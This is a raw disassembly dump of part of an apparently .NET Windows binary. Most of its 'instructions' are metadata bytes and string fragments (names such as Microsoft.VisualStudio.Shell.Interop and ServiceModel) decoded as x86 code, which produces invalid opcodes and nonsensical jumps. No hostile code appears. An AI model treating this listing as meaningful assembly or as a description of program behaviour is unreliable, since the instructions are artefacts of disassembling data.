  407dc8:	sub    eax,DWORD PTR [eax]
  407dca:	add    DWORD PTR [eax],eax
  407dcc:	je     0x407dce
  407dce:	sub    eax,DWORD PTR [eax]
  407dd0:	add    al,BYTE PTR [eax]
  407dd2:	mov    al,0x0
  407dd4:	sub    eax,0xb3000200
  407dd9:	add    BYTE PTR [edi],ch
  407ddb:	add    BYTE PTR [edx],al
  407ddd:	add    BYTE PTR [eax+eax*1+0x20031],dh
  407de4:	mov    ch,0x0
  407de6:	xor    eax,DWORD PTR [eax]
  407de8:	add    al,BYTE PTR [eax]
  407dea:	mov    dh,0x0
  407dec:	xor    eax,0x88000900
  407df1:	add    BYTE PTR [ebx],al
  407df3:	add    BYTE PTR [ecx],cl
  407df5:	add    BYTE PTR [edx+0x9000500],cl
  407dfb:	add    BYTE PTR [eax+eax*1+0x90007],cl
  407e02:	mov    es,WORD PTR [eax]
  407e04:	or     DWORD PTR [eax],eax
  407e06:	or     al,BYTE PTR [eax]
  407e08:	xchg   esi,eax
  407e09:	add    BYTE PTR [ebx],cl
  407e0b:	add    BYTE PTR [edx],dl
  407e0d:	add    BYTE PTR [edx+0x1],al
  407e10:	or     eax,DWORD PTR [eax]
  407e12:	loopne 0x407e1a
  407e14:	or     al,0x7
  407e16:	sub    BYTE PTR [edi],al
  407e18:	gs pop es
  407e1a:	(bad)  
  407e1b:	pop    es
  407e1c:	jmp    0x3486e28
  407e21:	or     BYTE PTR [eax+ecx*1],dl
  407e24:	dec    esi
  407e25:	or     BYTE PTR [esi+0x1c090408],dl
  407e2b:	or     DWORD PTR [ecx+ecx*1+0xa4609c8],esi
  407e32:	dec    ebx
  407e33:	or     dl,BYTE PTR [ebx+0xa]
  407e36:	outs   dx,DWORD PTR ds:[esi]
  407e37:	or     al,dl
  407e39:	or     dl,dl
  407e3b:	or     al,0x72
  407e3d:	(bad)  
  407e3f:	jge    0xd8503154
  407e45:	(bad)  
  407e47:	add    BYTE PTR [eax],0x0
  407e4a:	or     eax,DWORD PTR [eax]
  407e4c:	add    BYTE PTR [eax],al
  407e4e:	add    BYTE PTR [eax],al
  407e50:	add    BYTE PTR [eax],al
  407e52:	add    DWORD PTR [eax],eax
  407e54:	add    BYTE PTR [eax],al
  407e56:	and    al,0x5
  407e58:	add    BYTE PTR ss:[eax],al
  407e5b:	add    BYTE PTR [eax+eax*1],al
	...
  407e66:	add    BYTE PTR [eax],al
  407e68:	add    DWORD PTR [eax],eax
  407e6a:	out    0x1,al
  407e6c:	add    BYTE PTR [eax],al
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    al,0x0
	...
  407e7a:	add    BYTE PTR [eax],al
  407e7c:	add    DWORD PTR [eax],eax
  407e7e:	std    
  407e7f:	add    DWORD PTR [eax],eax
  407e81:	add    BYTE PTR [eax],al
  407e83:	add    BYTE PTR [eax+eax*1],al
	...
  407e8e:	add    BYTE PTR [eax],al
  407e90:	or     al,BYTE PTR [eax]
  407e92:	stos   BYTE PTR es:[edi],al
  407e93:	add    al,BYTE PTR [eax]
  407e95:	add    BYTE PTR [eax],al
  407e97:	add    BYTE PTR [edx],cl
	...
  407ea1:	add    BYTE PTR [eax],al
  407ea3:	add    BYTE PTR [edx],cl
  407ea5:	add    BYTE PTR ds:0x3,dh
  407eab:	add    BYTE PTR [ebx],cl
	...
  407eb5:	add    BYTE PTR [eax],al
  407eb7:	add    BYTE PTR [edx],cl
  407eb9:	add    BYTE PTR [ebx+eax*1+0x0],ah
  407ec0:	add    al,0x0
	...
  407eca:	add    BYTE PTR [eax],al
  407ecc:	or     al,BYTE PTR [eax]
  407ece:	out    dx,eax
  407ecf:	add    eax,DWORD PTR [eax]
  407ed1:	add    BYTE PTR [eax],al
  407ed3:	add    BYTE PTR [ebx],cl
	...
  407edd:	add    BYTE PTR [eax],al
  407edf:	add    BYTE PTR [edx],cl
  407ee1:	add    BYTE PTR [esp+eax*1],dh
  407ee4:	add    BYTE PTR [eax],al
  407ee6:	add    BYTE PTR [eax],al
  407ee8:	add    al,0x0
	...
  407ef2:	add    BYTE PTR [eax],al
  407ef4:	add    DWORD PTR [eax],eax
  407ef6:	out    dx,eax
  407ef7:	add    DWORD PTR [eax],eax
  407ef9:	add    BYTE PTR [eax],al
  407efb:	add    BYTE PTR [eax+eax*1],al
	...
  407f06:	add    BYTE PTR [eax],al
  407f08:	or     al,BYTE PTR [eax]
  407f0a:	test   DWORD PTR [ecx],edx
  407f0c:	add    BYTE PTR [eax],al
  407f0e:	add    BYTE PTR [eax],al
  407f10:	or     eax,DWORD PTR [eax]
	...
  407f1a:	add    BYTE PTR [eax],al
  407f1c:	or     al,BYTE PTR [eax]
  407f1e:	sahf   
  407f1f:	adc    al,0x0
  407f21:	add    BYTE PTR [eax],al
  407f23:	add    BYTE PTR [eax+eax*1],al
	...
  407f2e:	add    BYTE PTR [eax],al
  407f30:	add    DWORD PTR [eax],eax
  407f32:	xchg   esp,eax
  407f33:	and    al,0x0
  407f35:	add    BYTE PTR [eax],al
  407f37:	add    BYTE PTR [eax+eax*1],al
	...
  407f42:	add    BYTE PTR [eax],al
  407f44:	add    DWORD PTR [eax],eax
  407f46:	mov    cl,0x24
  407f48:	add    BYTE PTR [eax],al
  407f4a:	add    BYTE PTR [eax],al
  407f4c:	add    eax,DWORD PTR [eax]
  407f4e:	add    al,BYTE PTR [eax]
  407f50:	add    al,0x0
  407f52:	add    al,BYTE PTR [eax]
  407f54:	or     al,0x0
  407f56:	or     eax,DWORD PTR [eax]
  407f58:	or     eax,0x16000b00
  407f5d:	add    BYTE PTR [ecx],dl
  407f5f:	add    BYTE PTR [edi],dl
  407f61:	add    BYTE PTR [ecx],dl
  407f63:	add    BYTE PTR [eax],bl
  407f65:	add    BYTE PTR [ecx],dl
  407f67:	add    BYTE PTR [ecx],bl
  407f69:	add    BYTE PTR [ecx],dl
  407f6b:	add    BYTE PTR [edx],bl
  407f6d:	add    BYTE PTR [ecx],dl
  407f6f:	add    BYTE PTR [ebx],bl
  407f71:	add    BYTE PTR [ecx],dl
  407f73:	add    BYTE PTR [eax+eax*1],bl
  407f76:	adc    DWORD PTR [eax],eax
  407f78:	sbb    eax,0xa5001100
  407f7d:	add    BYTE PTR [ebx],bl
  407f7f:	pop    es
  407f80:	mov    edi,0x95078100
  407f85:	add    DWORD PTR [edx+ecx*1+0xc8101d1],edx
  407f8c:	add    BYTE PTR [eax],al
  407f8e:	add    BYTE PTR [eax],al
  407f90:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  407f97:	gs add BYTE PTR ds:[ebp+0x69],cl
  407f9c:	arpl   WORD PTR [edx+0x6f],si
  407f9f:	jae    0x408010
  407fa1:	data16 je 0x407fd2
  407fa4:	push   esi
  407fa5:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  407fac:	jne    0x408012
  407fae:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  407fb5:	dec    eax
  407fb6:	outs   dx,DWORD PTR ds:[esi]
  407fb7:	jae    0x40802d
  407fb9:	cs gs js 0x408022
  407fbd:	add    BYTE PTR [eax+0x72],dl
  407fc0:	outs   dx,DWORD PTR ds:[esi]
  407fc1:	addr16 jb 0x408025
  407fc4:	ins    DWORD PTR es:[edi],dx
  407fc5:	add    BYTE PTR [ebp+0x69],cl
  407fc8:	arpl   WORD PTR [edx+0x6f],si
  407fcb:	jae    0x40803c
  407fcd:	data16 je 0x407ffe
  407fd0:	push   esi
  407fd1:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  407fd8:	jne    0x40803e
  407fda:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  407fe1:	dec    eax
  407fe2:	outs   dx,DWORD PTR ds:[esi]
  407fe3:	jae    0x408059
  407fe5:	add    BYTE PTR [ecx+0x6e],cl
  407fe8:	jae    0x40805e
  407fea:	popa   
  407feb:	outs   dx,BYTE PTR ds:[esi]
  407fec:	arpl   WORD PTR [ebp+0x50],sp
  407fef:	jb     0x408060
  407ff1:	jbe    0x40805c
  407ff3:	fs gs jb 0x407ff7
  407ff7:	dec    esp
  407ff8:	outs   dx,DWORD PTR ds:[esi]
  407ff9:	arpl   WORD PTR [ecx+0x6c],sp
  407ffc:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  408003:	inc    edx
  408004:	gs push 0x6f697661
  40800a:	jb     0x40800c
  40800c:	inc    ebx
  40800d:	inc    edx
  40800e:	dec    ebp
  40800f:	push   ebx
  408010:	gs jb  0x408089
  408013:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  40801a:	outs   dx,DWORD PTR ds:[esi]
  40801b:	jb     0x408086
  40801d:	jp     0x408080
  40801f:	je     0x40808a
  408021:	outs   dx,DWORD PTR ds:[esi]
  408022:	outs   dx,BYTE PTR ds:[esi]
  408023:	dec    ebp
  408024:	popa   
  408025:	outs   dx,BYTE PTR ds:[esi]
  408026:	popa   
  408027:	addr16 gs jb 0x40802b
  40802b:	inc    ebx
  40802c:	inc    edx
  40802d:	dec    ebp
  40802e:	push   esi
  40802f:	popa   
  408030:	ins    BYTE PTR es:[edi],dx
  408031:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x436e6f69
  408039:	popa   
  40803a:	ins    BYTE PTR es:[edi],dx
  40803b:	ins    BYTE PTR es:[edi],dx
  40803c:	bound  esp,QWORD PTR [ecx+0x63]
  40803f:	imul   eax,DWORD PTR [eax],0x46
  408042:	jb     0x4080a5
  408044:	ins    DWORD PTR es:[edi],dx
  408045:	gs ja  0x4080b7
  408048:	jb     0x4080b5
  40804a:	dec    ebp
  40804b:	jne    0x4080b9
  40804d:	je     0x4080b8
  40804f:	push   esp
  408050:	popa   
  408051:	jb     0x4080ba
  408053:	gs je  0x4080bf
  408056:	outs   dx,BYTE PTR ds:[esi]
  408057:	add    BYTE PTR [si+0x69],cl
  40805b:	data16 gs je 0x4080c8
  40805f:	ins    DWORD PTR es:[edi],dx
  408060:	gs push ebx
  408062:	jo     0x4080d3
  408064:	outs   dx,BYTE PTR ds:[esi]
  408065:	jae    0x4080d6
  408067:	jb     0x408069
  408069:	dec    ebp
  40806a:	jne    0x4080d8
  40806c:	je     0x4080d7
  40806e:	je     0x4080d1
  408070:	jb     0x4080d9
  408072:	gs je  0x4080de
  408075:	outs   dx,BYTE PTR ds:[esi]
  408076:	addr16 push eax
  408078:	jb     0x4080e9
  40807a:	jbe    0x4080e5
  40807c:	fs gs jb 0x408080
  408080:	inc    ebx
  408081:	inc    edx
  408082:	dec    ebp
  408083:	dec    eax
  408084:	outs   dx,DWORD PTR ds:[esi]
  408085:	jae    0x4080fb
  408087:	gs fs dec ebp
  40808a:	jne    0x4080f8
  40808c:	je     0x4080f7
  40808e:	je     0x4080f1
  408090:	jb     0x4080f9
  408092:	gs je  0x4080fe
  408095:	outs   dx,BYTE PTR ds:[esi]
  408096:	addr16 push eax
  408098:	jb     0x408109
  40809a:	jbe    0x408105
  40809c:	fs gs jb 0x4080a0
  4080a0:	push   edx
  4080a1:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  4080aa:	add    BYTE PTR [ebx+0x6f],dl
  4080ad:	jb     0x408123
  4080af:	inc    edx
  4080b0:	jns    0x408108
  4080b2:	gs jb  0x408128
  4080b5:	imul   ebp,DWORD PTR [edi+0x6e],0x63736544
  4080bc:	outs   dx,BYTE PTR gs:[esi]
  4080be:	imul   ebp,DWORD PTR fs:[esi+0x67],0x6c754600
  4080c6:	ins    BYTE PTR es:[edi],dx
  4080c7:	dec    esi
  4080c8:	popa   
  4080c9:	ins    DWORD PTR es:[edi],dx
  4080ca:	gs inc ebx
  4080cc:	outs   dx,DWORD PTR ds:[esi]
  4080cd:	ins    DWORD PTR es:[edi],dx
  4080ce:	jo     0x408131
  4080d0:	jb     0x408137
  4080d2:	jb     0x4080d4
  4080d4:	inc    ecx
  4080d5:	jae    0x40814a
  4080d7:	gs ins DWORD PTR es:[edi],dx
  4080d9:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4080dd:	popa   
  4080de:	bound  ebp,QWORD PTR [ebp+eiz*2+0x49]
  4080e2:	outs   dx,BYTE PTR ds:[esi]
  4080e3:	outs   dx,WORD PTR ds:[esi]
  4080e5:	add    BYTE PTR [ecx+0x73],al
  4080e8:	jae    0x40814f
  4080ea:	ins    DWORD PTR es:[edi],dx
  4080eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x45]
  4080ef:	outs   dx,BYTE PTR ds:[esi]
  4080f0:	je     0x408164
  4080f2:	jns    0x4080f4
  4080f4:	push   edx
  4080f5:	gs ins DWORD PTR es:[edi],dx
  4080f7:	outs   dx,DWORD PTR ds:[esi]
  4080f8:	je     0x40815f
  4080fa:	inc    ebx
  4080fb:	inc    edx
  4080fc:	dec    ebp
  4080fd:	push   ebx
  4080fe:	gs jb  0x408177
  408101:	imul   esp,DWORD PTR [ebx+0x65],0x6d655200
  408108:	outs   dx,DWORD PTR ds:[esi]
  408109:	je     0x408170
  40810b:	inc    ebx
  40810c:	inc    edx
  40810d:	dec    ebp
  40810e:	push   ebx
  40810f:	gs jb  0x408188
  408112:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  408119:	bound  esp,QWORD PTR [ecx+0x63]
  40811c:	imul   eax,DWORD PTR [eax],0x56
  40811f:	jae    0x408177
  408121:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  408128:	popa   
  408129:	je     0x408193
  40812b:	push   eax
  40812c:	jb     0x40819d
  40812e:	jbe    0x408199
  408130:	fs gs jb 0x40817a
  408134:	popa   
  408135:	arpl   WORD PTR [edi+ebp*2+0x72],si
  408139:	jns    0x40813b
  40813b:	push   edx
  40813c:	gs ins DWORD PTR es:[edi],dx
  40813e:	outs   dx,DWORD PTR ds:[esi]
  40813f:	je     0x4081a6
  408141:	push   esi
  408142:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  408149:	popa   
  40814a:	je     0x4081b4
  40814c:	push   eax
  40814d:	jb     0x4081be
  40814f:	jbe    0x4081ba
  408151:	fs gs jb 0x408155
  408155:	push   esi
  408156:	jae    0x4081ae
  408158:	imul   esi,DWORD PTR [edx+0x74],0x466c6175
  40815f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x69567356
  408167:	jb     0x4081dd
  408169:	jne    0x4081cc
  40816b:	ins    BYTE PTR es:[edi],dx
  40816c:	inc    esp
  40816d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408174:	jns    0x408176
  408176:	ins    DWORD PTR es:[edi],dx
  408177:	jae    0x4081dc
  408179:	outs   dx,DWORD PTR ds:[esi]
  40817a:	jb     0x4081e8
  40817c:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  408183:	gs ins DWORD PTR es:[edi],dx
  408185:	add    BYTE PTR [edi+0x62],cl
  408188:	push   0x65
  40818a:	arpl   WORD PTR [eax+eax*1+0x53],si
  40818e:	jns    0x408203
  408190:	je     0x4081f7
  408192:	ins    DWORD PTR es:[edi],dx
  408193:	cs push ebx
  408195:	gs jb  0x40820e
  408198:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40819f:	ins    BYTE PTR es:[edi],dx
  4081a0:	add    BYTE PTR [ebx+0x79],dl
  4081a3:	jae    0x408219
  4081a5:	gs ins DWORD PTR es:[edi],dx
  4081a7:	cs push ebx
  4081a9:	gs jb  0x408222
  4081ac:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4081b3:	ins    BYTE PTR es:[edi],dx
  4081b4:	cs inc esp
  4081b6:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  4081bd:	gs jb  0x4081c0
  4081c0:	dec    ecx
  4081c1:	dec    ecx
  4081c2:	outs   dx,BYTE PTR ds:[esi]
  4081c3:	jae    0x408239
  4081c5:	popa   
  4081c6:	outs   dx,BYTE PTR ds:[esi]
  4081c7:	arpl   WORD PTR [ebp+0x50],sp
  4081ca:	jb     0x40823b
  4081cc:	jbe    0x408237
  4081ce:	fs gs jb 0x4081d2
  4081d2:	push   ebx
  4081d3:	jns    0x408248
  4081d5:	je     0x40823c
  4081d7:	ins    DWORD PTR es:[edi],dx
  4081d8:	cs push ebx
  4081da:	gs jb  0x408253
  4081dd:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4081e4:	ins    BYTE PTR es:[edi],dx
  4081e5:	cs inc esp
  4081e7:	gs jae 0x40824d
  4081ea:	jb     0x408255
  4081ec:	jo     0x408262
  4081ee:	imul   ebp,DWORD PTR [edi+0x6e],0x6e454900
  4081f5:	fs jo  0x408267
  4081f8:	imul   ebp,DWORD PTR [esi+0x74],0x61686542
  4081ff:	jbe    0x40826a
  408201:	outs   dx,DWORD PTR ds:[esi]
  408202:	jb     0x408204
  408204:	dec    ecx
  408205:	inc    esp
  408206:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  40820d:	dec    ebp
  40820e:	gs jae 0x408284
  408211:	popa   
  408212:	addr16 gs dec ecx
  408215:	outs   dx,BYTE PTR ds:[esi]
  408216:	jae    0x408288
  408218:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40821d:	add    BYTE PTR [ebx+0x65],dl
  408220:	jb     0x408298
  408222:	imul   esp,DWORD PTR [ebx+0x65],0x68747541
  408229:	outs   dx,DWORD PTR ds:[esi]
  40822a:	jb     0x408295
  40822c:	jp     0x40828f
  40822e:	je     0x408299
  408230:	outs   dx,DWORD PTR ds:[esi]
  408231:	outs   dx,BYTE PTR ds:[esi]
  408232:	dec    ebp
  408233:	popa   
  408234:	outs   dx,BYTE PTR ds:[esi]
  408235:	popa   
  408236:	addr16 gs jb 0x40823a
  40823a:	push   ebx
  40823b:	jns    0x4082b0
  40823d:	je     0x4082a4
  40823f:	ins    DWORD PTR es:[edi],dx
  408240:	cs push edi
  408242:	bound  eax,QWORD PTR gs:[eax]
  408245:	push   ebx
  408246:	jns    0x4082bb
  408248:	je     0x4082af
  40824a:	ins    DWORD PTR es:[edi],dx
  40824b:	cs push edi
  40824d:	bound  ebp,QWORD PTR gs:[esi]
  408250:	inc    ebx
  408251:	outs   dx,DWORD PTR ds:[esi]
  408252:	ins    DWORD PTR es:[edi],dx
  408253:	jo     0x4082be
  408255:	ins    BYTE PTR es:[edi],dx
  408256:	popa   
  408257:	je     0x4082c2
  408259:	outs   dx,DWORD PTR ds:[esi]
  40825a:	outs   dx,BYTE PTR ds:[esi]
  40825b:	add    BYTE PTR [ebx+0x6c],al
  40825e:	imul   esp,DWORD PTR [ebp+0x6e],0x69754274
  408265:	ins    BYTE PTR es:[edi],dx
  408266:	fs dec ebp
  408268:	popa   
  408269:	outs   dx,BYTE PTR ds:[esi]
  40826a:	popa   
  40826b:	addr16 gs jb 0x4082b2
  40826f:	popa   
  408270:	ins    BYTE PTR es:[edi],dx
  408271:	ins    BYTE PTR es:[edi],dx
  408272:	bound  esp,QWORD PTR [ecx+0x63]
  408275:	imul   eax,DWORD PTR [eax],0x4d
  408278:	popa   
  408279:	jb     0x4082ee
  40827b:	push   0x79426c61
  408280:	push   edx
  408281:	gs dec di
  408284:	bound  ebp,QWORD PTR [edx+0x65]
  408287:	arpl   WORD PTR [eax+eax*1+0x53],si
  40828b:	jns    0x408300
  40828d:	je     0x4082f4
  40828f:	ins    DWORD PTR es:[edi],dx
  408290:	cs push edx
  408292:	jne    0x408302
  408294:	je     0x4082ff
  408296:	ins    DWORD PTR es:[edi],dx
  408297:	gs cs push edx
  40829a:	gs ins DWORD PTR es:[edi],dx
  40829c:	outs   dx,DWORD PTR ds:[esi]
  40829d:	je     0x408308
  40829f:	outs   dx,BYTE PTR ds:[esi]
  4082a0:	addr16 cs dec esp
  4082a3:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  4082aa:	add    BYTE PTR [ecx+0x53],cl
  4082ad:	jo     0x40831e
  4082af:	outs   dx,BYTE PTR ds:[esi]
  4082b0:	jae    0x408321
  4082b2:	jb     0x4082b4
  4082b4:	dec    ecx
  4082b5:	push   ebx
  4082b6:	gs jb  0x40832f
  4082b9:	imul   esp,DWORD PTR [ebx+0x65],0x766f7250
  4082c0:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x63694d00
  4082c8:	jb     0x408339
  4082ca:	jae    0x40833b
  4082cc:	data16 je 0x4082fd
  4082cf:	push   esi
  4082d0:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4082d7:	jne    0x40833d
  4082d9:	imul   ebp,DWORD PTR [edi+0x2e],0x6c656853
  4082e0:	ins    BYTE PTR es:[edi],dx
  4082e1:	cs dec ecx
  4082e3:	outs   dx,BYTE PTR ds:[esi]
  4082e4:	je     0x40834b
  4082e6:	jb     0x408357
  4082e8:	jo     0x408318
  4082ea:	xor    DWORD PTR [eax],esi
  4082ec:	xor    BYTE PTR cs:[eax],al
  4082ef:	dec    ebp
  4082f0:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4082f7:	je     0x408327
  4082f9:	push   esi
  4082fa:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408301:	jne    0x408367
  408303:	imul   ebp,DWORD PTR [edi+0x2e],0x6c656853
  40830a:	ins    BYTE PTR es:[edi],dx
  40830b:	cs dec ecx
  40830d:	outs   dx,BYTE PTR ds:[esi]
  40830e:	je     0x408375
  408310:	jb     0x408381
  408312:	jo     0x408314
  408314:	dec    ecx
  408315:	push   esi
  408316:	jae    0x40835c
  408318:	gs jae 0x408384
  40831b:	outs   dx,BYTE PTR ds:[si]
  40831d:	push   esp
  40831e:	imul   ebp,DWORD PTR [ebp+0x65],0x65737341
  408325:	ins    DWORD PTR es:[edi],dx
  408326:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  40832a:	gs jae 0x40839c
  40832d:	ins    BYTE PTR es:[edi],dx
  40832e:	jne    0x4083a4
  408330:	imul   ebp,DWORD PTR [edi+0x6e],0x63694d00
  408337:	jb     0x4083a8
  408339:	jae    0x4083aa
  40833b:	data16 je 0x40836c
  40833e:	push   esi
  40833f:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408346:	jne    0x4083ac
  408348:	imul   ebp,DWORD PTR [edi+0x2e],0x6c656853
  40834f:	ins    BYTE PTR es:[edi],dx
  408350:	cs dec ecx
  408352:	outs   dx,BYTE PTR ds:[esi]
  408353:	je     0x4083ba
  408355:	jb     0x4083c6
  408357:	jo     0x408387
  408359:	xor    DWORD PTR [ecx],esi
  40835b:	xor    BYTE PTR cs:[eax],al
  40835e:	dec    ecx
  40835f:	push   esi
  408360:	jae    0x4083a6
  408362:	gs jae 0x4083ce
  408365:	outs   dx,BYTE PTR ds:[si]
  408367:	push   esp
  408368:	imul   ebp,DWORD PTR [ebp+0x65],0x65737341
  40836f:	ins    DWORD PTR es:[edi],dx
  408370:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  408374:	gs jae 0x4083e6
  408377:	ins    BYTE PTR es:[edi],dx
  408378:	jne    0x4083ee
  40837a:	imul   ebp,DWORD PTR [edi+0x6e],0x79530032
  408381:	jae    0x4083f7
  408383:	gs ins DWORD PTR es:[edi],dx
  408385:	cs inc esp
  408387:	gs jae 0x4083f3
  40838a:	outs   dx,BYTE PTR ds:[si]
  40838c:	add    BYTE PTR [ebx+0x79],dl
  40838f:	jae    0x408405
  408391:	gs ins DWORD PTR es:[edi],dx
  408393:	cs inc ebx
  408395:	outs   dx,DWORD PTR ds:[esi]
  408396:	ins    DWORD PTR es:[edi],dx
  408397:	jo     0x408408
  408399:	outs   dx,BYTE PTR ds:[esi]
  40839a:	outs   dx,BYTE PTR gs:[esi]
  40839c:	je     0x4083eb
  40839e:	outs   dx,DWORD PTR ds:[esi]
  40839f:	fs gs ins BYTE PTR es:[edi],dx
  4083a2:	cs inc esp
  4083a4:	gs jae 0x408410
  4083a7:	outs   dx,BYTE PTR ds:[si]
  4083a9:	add    BYTE PTR [ecx+0x44],cl
  4083ac:	gs jae 0x408418
  4083af:	outs   dx,BYTE PTR ds:[si]
  4083b1:	push   esp
  4083b2:	imul   ebp,DWORD PTR [ebp+0x65],0x65737341
  4083b9:	ins    DWORD PTR es:[edi],dx
  4083ba:	bound  ebp,QWORD PTR [ecx+edi*2+0x4c]
  4083be:	outs   dx,DWORD PTR ds:[esi]
  4083bf:	popa   
  4083c0:	fs gs jb 0x4083c4
  4083c4:	dec    ebp
  4083c5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4083cc:	je     0x4083fc
  4083ce:	push   esi
  4083cf:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4083d6:	jne    0x40843c
  4083d8:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  4083df:	dec    eax
  4083e0:	outs   dx,DWORD PTR ds:[esi]
  4083e1:	jae    0x408457
  4083e3:	cs push ebx
  4083e5:	push   0x64657261
  4083ea:	add    BYTE PTR [ecx+0x56],cl
  4083ed:	jae    0x408446
  4083ef:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  4083f3:	ins    BYTE PTR es:[edi],dx
  4083f4:	je     0x40845f
  4083f6:	push   esp
  4083f7:	popa   
  4083f8:	jb     0x408461
  4083fa:	gs je  0x408466
  4083fd:	outs   dx,BYTE PTR ds:[esi]
  4083fe:	addr16 push ebx
  408400:	jbe    0x408465
  408402:	add    BYTE PTR [ecx+0x56],cl
  408405:	jae    0x40845e
  408407:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  40840b:	ins    BYTE PTR es:[edi],dx
  40840c:	je     0x408477
  40840e:	push   esp
  40840f:	popa   
  408410:	jb     0x408479
  408412:	gs je  0x40847e
  408415:	outs   dx,BYTE PTR ds:[esi]
  408416:	addr16 push ebx
  408418:	jbe    0x40847d
  40841a:	xor    al,BYTE PTR [eax]
  40841c:	push   ebx
  40841d:	jns    0x408492
  40841f:	je     0x408486
  408421:	ins    DWORD PTR es:[edi],dx
  408422:	cs push edi
  408424:	bound  ebp,QWORD PTR gs:[esi]
  408427:	dec    eax
  408428:	outs   dx,DWORD PTR ds:[esi]
  408429:	jae    0x40849f
  40842b:	imul   ebp,DWORD PTR [esi+0x67],0x65524900
  408432:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  40843a:	dec    edi
  40843b:	bound  ebp,QWORD PTR [edx+0x65]
  40843e:	arpl   WORD PTR [eax+eax*1+0x53],si
  408442:	jns    0x4084b7
  408444:	je     0x4084ab
  408446:	ins    DWORD PTR es:[edi],dx
  408447:	cs inc ebx
  408449:	outs   dx,DWORD PTR ds:[esi]
  40844a:	ins    BYTE PTR es:[edi],dx
  40844b:	ins    BYTE PTR es:[edi],dx
  40844c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408451:	outs   dx,BYTE PTR ds:[esi]
  408452:	jae    0x408454
  408454:	dec    ecx
  408455:	inc    ebx
  408456:	outs   dx,DWORD PTR ds:[esi]
  408457:	ins    DWORD PTR es:[edi],dx
  408458:	jo     0x4084bb
  40845a:	jb     0x4084c1
  40845c:	jb     0x40845e
  40845e:	dec    ecx
  40845f:	inc    ebx
  408460:	outs   dx,DWORD PTR ds:[esi]
  408461:	ins    DWORD PTR es:[edi],dx
  408462:	jo     0x4084c5
  408464:	jb     0x4084c7
  408466:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40846a:	dec    ecx
  40846b:	inc    esp
  40846c:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  408473:	ins    BYTE PTR es:[edi],dx
  408474:	add    BYTE PTR gs:[ecx+0x52],cl
  408478:	gs ins DWORD PTR es:[edi],dx
  40847a:	outs   dx,DWORD PTR ds:[esi]
  40847b:	je     0x4084e2
  40847d:	inc    ebx
  40847e:	inc    edx
  40847f:	dec    ebp
  408480:	push   ebx
  408481:	gs jb  0x4084fa
  408484:	imul   esp,DWORD PTR [ebx+0x65],0x72695600
  40848b:	je     0x408502
  40848d:	popa   
  40848e:	ins    BYTE PTR es:[edi],dx
  40848f:	push   eax
  408490:	popa   
  408491:	je     0x4084fb
  408493:	push   eax
  408494:	jb     0x408505
  408496:	jbe    0x408501
  408498:	fs gs jb 0x40849c
  40849c:	push   esi
  40849d:	imul   esi,DWORD PTR [edx+0x74],0x466c6175
  4084a4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x74726956
  4084ac:	jne    0x40850f
  4084ae:	ins    BYTE PTR es:[edi],dx
  4084af:	inc    esp
  4084b0:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4084b7:	jns    0x4084b9
  4084b9:	push   ebx
  4084ba:	gs jb  0x408533
  4084bd:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  4084c4:	add    BYTE PTR [edi+0x63],bl
  4084c7:	outs   dx,DWORD PTR ds:[esi]
  4084c8:	ins    DWORD PTR es:[edi],dx
  4084c9:	ins    DWORD PTR es:[edi],dx
  4084ca:	popa   
  4084cb:	outs   dx,BYTE PTR ds:[esi]
  4084cc:	fs push ebx
  4084ce:	gs jb  0x408547
  4084d1:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  4084d8:	add    BYTE PTR [ebx+0x79],dl
  4084db:	jae    0x408551
  4084dd:	gs ins DWORD PTR es:[edi],dx
  4084df:	cs push esp
  4084e1:	push   0x64616572
  4084e6:	imul   ebp,DWORD PTR [esi+0x67],0x74754100
  4084ed:	outs   dx,DWORD PTR ds:[esi]
  4084ee:	push   edx
  4084ef:	gs jae 0x408557
  4084f2:	je     0x408539
  4084f4:	jbe    0x40855b
  4084f6:	outs   dx,BYTE PTR ds:[esi]
  4084f7:	je     0x4084f9
  4084f9:	pop    edi
  4084fa:	jo     0x40856e
  4084fc:	outs   dx,DWORD PTR ds:[esi]
  4084fd:	arpl   WORD PTR [ebp+0x73],sp
  408500:	jae    0x408547
